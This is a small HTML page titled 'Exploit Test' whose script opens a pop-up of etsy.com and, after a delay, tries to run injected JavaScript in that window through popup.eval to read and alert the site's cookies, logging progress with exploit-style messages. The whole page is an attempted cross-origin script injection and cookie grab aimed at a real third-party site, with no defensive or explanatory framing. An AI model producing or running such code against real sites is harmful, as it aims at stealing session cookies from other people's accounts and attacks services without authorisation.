<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploit Test</title>
</head>
<body>
    <h1>Click Below to Open the Pop-up</h1>
    <button id="exploitBtn">Launch Pop-up</button>

    <script>
        document.getElementById("exploitBtn").addEventListener("click", () => {
            let popup = window.open("https://www.etsy.com", "EtsyPopup", "width=800,height=600");

            if (popup) {
                console.log("[+] Pop-up opened successfully. Checking access...");

                setTimeout(() => {
                    try {
                        console.log("[+] Attempting to execute JS in pop-up...");
                        popup.eval(`console.log("[*] Injected Script Running"); alert(document.cookie);`);
                    } catch (err) {
                        console.error("[!] Exploit failed:", err);
                    }
                }, 3000);
            } else {
                console.log("[!] Pop-up blocked. Allow pop-ups and try again.");
            }
        });
    </script>
</body>
</html>
